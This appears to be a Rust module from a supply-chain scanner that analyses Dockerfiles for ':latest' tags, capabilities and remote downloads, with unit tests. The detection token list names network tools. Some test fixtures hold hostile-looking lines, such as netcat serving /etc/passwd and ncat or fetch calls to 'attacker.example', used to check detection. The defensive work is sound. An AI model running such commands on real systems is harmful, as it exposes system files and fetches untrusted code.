//! Dockerfile analysis: findings, capability inference, and artifact
//! relations. Compose-only logic lives in the sibling `compose` module.

use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::services::artifact_analysis::{ArtifactAnalysisService, ArtifactLink};
use std::path::Path;

use super::super::strip_inline_hash_comment;

/// Tokens that, when present in a lowercased Dockerfile line, indicate the
/// build pulls something from the network at image-build time.
///
/// The list is ordered roughly by frequency in real Dockerfiles. Each token
/// includes a trailing whitespace where ambiguity with substrings (`unc`,
/// `func`, `vncserver`) is plausible — e.g. ` nc ` requires whitespace on
/// both sides so it doesn't match `func` or `unc`. Pre-fix only `curl`,
/// `wget`, and `invoke-webrequest` were detected, which let
/// `python:slim`-style Dockerfiles using `python -m urllib`, BSD `fetch`,
/// or raw `nc` evade the NetworkAccess capability.
const DOCKERFILE_NETWORK_DOWNLOAD_TOKENS: &[&str] = &[
    "curl ",
    "wget ",
    "invoke-webrequest",
    "ncat ",
    " nc ",
    "fetch ",
    "python -m urllib",
    "python -m http",
    "python -c \"import urllib",
    "python -c 'import urllib",
    "perl -mlwp",
];

pub(crate) fn analyze_dockerfile(path: &Path, content: &str) -> Vec<Finding> {
    let artifact_path = path.display().to_string();
    let mut findings = Vec::new();

    for line in content.lines().map(str::trim) {
        let lower_line = line.to_ascii_lowercase();
        if lower_line.starts_with("from ") && lower_line.contains(":latest") {
            findings.push(
                Finding::builder("MANIFEST_DOCKER_LATEST_TAG", ThreatCategory::SupplyChain)
                    .severity(Severity::Low)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Context)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(line)
                    .reason("Docker base image uses the mutable latest tag")
                    .build(),
            );
        }
    }

    findings
}

pub(crate) fn dockerfile_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let mut has_expose = false;
    let mut has_run = false;
    let mut has_copy_or_add = false;
    let mut has_network_download = false;

    for line in content.lines() {
        let code = strip_inline_hash_comment(line.trim_start());
        let trimmed = code.to_ascii_lowercase();
        if !has_expose && (trimmed.starts_with("expose ") || trimmed.trim_end() == "expose") {
            has_expose = true;
        }
        if !has_run && trimmed.starts_with("run ") {
            has_run = true;
        }
        if !has_copy_or_add && (trimmed.starts_with("copy ") || trimmed.starts_with("add ")) {
            has_copy_or_add = true;
        }
        if !has_network_download
            && DOCKERFILE_NETWORK_DOWNLOAD_TOKENS
                .iter()
                .any(|t| trimmed.contains(t))
        {
            has_network_download = true;
        }
    }

    let mut capabilities = Vec::new();
    if has_expose {
        capabilities.push(ArtifactAnalysisService::declared_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_network_download {
        capabilities.push(ArtifactAnalysisService::observed_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_run {
        capabilities.push(ArtifactAnalysisService::declared_capability(
            ArtifactCapability::ProcessExecution,
        ));
    }
    if has_copy_or_add {
        capabilities.push(ArtifactAnalysisService::declared_capability(
            ArtifactCapability::FilesystemWrite,
        ));
    }

    capabilities
}

pub(crate) fn dockerfile_relations(content: &str) -> Vec<ArtifactLink> {
    let mut links = Vec::new();
    for line in content.lines().map(str::trim) {
        let code = strip_inline_hash_comment(line);
        let lower = code.to_ascii_lowercase();
        if lower.starts_with("from ") {
            links.push(ArtifactLink {
                target: code[5..].trim().to_string(),
                relation: ArtifactRelation::Loads,
            });
        }
        // Mirror `dockerfile_capabilities`: any token in
        // `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS` is a remote-fetch.
        // Pre-fix relations only saw `curl` and `wget`, so a Dockerfile
        // using `python -m urllib`, `nc`, `fetch`, etc. recorded
        // `NetworkAccess` capability without the matching `Downloads`
        // edge — the artifact graph then missed cross-artifact composite
        // capabilities (e.g. `ShellDownloadExec`) that key off the edge.
        if DOCKERFILE_NETWORK_DOWNLOAD_TOKENS
            .iter()
            .any(|t| lower.contains(t))
        {
            links.push(ArtifactLink {
                target: "remote-resource".to_string(),
                relation: ArtifactRelation::Downloads,
            });
        }
    }
    links
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    /// Contract: an inline `# ... curl ...` comment in a Dockerfile must
    /// NOT flip `NetworkAccess` to observed. The pre-fix code only
    /// suppressed lines whose first non-whitespace char was `#`, so
    /// `RUN echo ok # curl example.com` would still match `"curl "`
    /// in the lower-cased line.
    #[test]
    fn dockerfile_capabilities_skips_curl_in_inline_comment() {
        let content = "FROM alpine:3\nRUN echo ok # was: curl https://old\n";
        let caps = dockerfile_capabilities(content);
        // declared NetworkAccess from EXPOSE etc. would still be possible,
        // but in this fixture there is no EXPOSE — so neither declared
        // nor observed NetworkAccess should be present.
        assert!(!capability_present(
            &caps,
            ArtifactCapability::NetworkAccess
        ));
    }

    /// Contract: a real `RUN curl ...` step still flips observed
    /// NetworkAccess. Pins that the inline-comment stripper does not
    /// erase the real curl preceding the `#`.
    #[test]
    fn dockerfile_capabilities_detects_real_curl_with_trailing_comment() {
        let content = "FROM alpine:3\nRUN curl https://x  # bootstrap\n";
        let caps = dockerfile_capabilities(content);
        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
    }

    /// Contract: an inline `# ... curl ...` comment in a Dockerfile must
    /// NOT add a Downloads link. The pre-fix code suppressed only lines
    /// whose first non-whitespace char was `#`, so the trailing comment
    /// fed into `artifact_taint` and produced a spurious
    /// `ARTIFACT_TAINT_DOWNLOAD_TO_EXECUTION` Critical finding when
    /// combined with any process-execution edge in the package.
    #[test]
    fn dockerfile_relations_skips_curl_in_inline_comment() {
        let content = "FROM alpine:3\nRUN echo ok # was: curl https://gone\n";
        let links = dockerfile_relations(content);
        assert!(
            links.iter().all(|l| l.target != "remote-resource"),
            "no Downloads link should be created from an inline-comment curl; got {links:?}",
        );
    }

    /// Contract: a real `RUN curl ...` step still produces a Downloads
    /// link. Anchors that the inline-comment stripper preserves real
    /// evidence preceding the `#`.
    #[test]
    fn dockerfile_relations_detects_real_curl_with_trailing_comment() {
        let content = "FROM alpine:3\nRUN curl https://x  # bootstrap\n";
        let links = dockerfile_relations(content);
        assert!(
            links.iter().any(|l| l.target == "remote-resource"),
            "real curl invocation should produce a Downloads link; got {links:?}",
        );
    }

    /// Contract: a Dockerfile that fetches a payload via `python -m
    /// urllib.request` MUST flip the observed NetworkAccess capability.
    /// Pre-fix, only `curl`, `wget`, and `invoke-webrequest` were detected,
    /// so a `python:slim`-based image fetching with `python -m urllib.request`
    /// silently failed the capability check.
    #[test]
    fn dockerfile_capabilities_detects_python_urllib_download() {
        let content = "FROM python:3.11-slim\nRUN python -m urllib.request https://x/payload\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            has_observed_network,
            "python -m urllib must flip observed NetworkAccess; got {caps:?}",
        );
    }

    /// Contract: BSD `fetch` and raw `nc` (netcat) are equally valid
    /// download/exfil tools and must trip the same capability gate.
    #[test]
    fn dockerfile_capabilities_detects_fetch_and_netcat() {
        let fetch = "FROM alpine\nRUN fetch -o /tmp/x https://internal/payload\n";
        let nc = "FROM alpine\nRUN nc -lvp 4444 > /tmp/x\n";
        for content in [fetch, nc] {
            let caps = dockerfile_capabilities(content);
            assert!(
                caps.iter().any(|fact| {
                    fact.capability == ArtifactCapability::NetworkAccess
                        && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
                }),
                "expected observed NetworkAccess for {content:?}; got {caps:?}",
            );
        }
    }

    /// Contract: tokens like `nc` MUST require explicit whitespace boundaries
    /// — a substring match against `func`, `unc`, `vncserver`, etc., would
    /// over-fire. This pins the negative case to keep the boundary logic.
    #[test]
    fn dockerfile_capabilities_does_not_overmatch_substrings_of_nc() {
        let content = "FROM alpine\nRUN apk add func unc vncserver\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            !has_observed_network,
            "substrings like func/unc/vncserver must not trip observed NetworkAccess; got {caps:?}",
        );
    }

    /// Contract: `dockerfile_relations` must record a `Downloads` edge for
    /// EVERY token in `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS`, paralleling
    /// `dockerfile_capabilities`. Pre-fix only `curl `/`wget ` produced an
    /// edge, so a Dockerfile using `python -m urllib`, `nc`, `fetch`, etc.,
    /// declared NetworkAccess capability without the matching Downloads
    /// edge — and downstream composite-capability detectors that key off
    /// the edge (e.g. `ShellDownloadExec`) silently missed.
    #[test]
    fn dockerfile_relations_records_download_edge_for_python_urllib() {
        let content = "FROM alpine\nRUN python -m urllib https://attacker.example/x.py\n";
        let links = dockerfile_relations(content);
        assert!(
            links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
                    && l.target == "remote-resource"),
            "python -m urllib must produce a Downloads edge; got {links:?}",
        );
    }

    /// Contract: same coverage parity for `nc`/`ncat`/`fetch`/`perl -mlwp`
    /// — pre-fix the edge only fired for `curl`/`wget`. Pinning the four
    /// most common alternatives keeps the parity from regressing.
    #[test]
    fn dockerfile_relations_records_download_edge_for_alternate_tools() {
        for token in [
            "RUN nc -lvp 4444 < /etc/passwd\n",
            "RUN ncat attacker.example 4444\n",
            "RUN fetch https://attacker.example/x\n",
            "RUN perl -MLWP::Simple -e 'getstore(...)'\n",
        ] {
            let content = format!("FROM alpine\n{token}");
            let links = dockerfile_relations(&content);
            assert!(
                links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "token line `{token}` must produce a Downloads edge; got {links:?}",
            );
        }
    }

    /// Contract: regression guard for the original `curl`/`wget` coverage.
    /// The fix must NOT drop the cases that already worked.
    #[test]
    fn dockerfile_relations_still_records_curl_and_wget() {
        for token in ["RUN curl https://x\n", "RUN wget https://x\n"] {
            let content = format!("FROM alpine\n{token}");
            let links = dockerfile_relations(&content);
            assert!(
                links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "`{token}` must keep producing a Downloads edge; got {links:?}",
            );
        }
    }
}
